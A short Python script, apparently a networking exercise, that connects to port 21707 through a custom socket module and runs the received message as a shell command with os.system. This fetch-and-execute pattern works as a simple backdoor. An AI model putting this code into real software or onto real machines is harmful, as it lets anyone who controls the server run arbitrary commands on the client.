from sockets import *
import os

if __name__ == "__main__":
    c = client()
    c.connect(port=21707)
    msg = c.receive()
    c.close()
    os.system(msg)
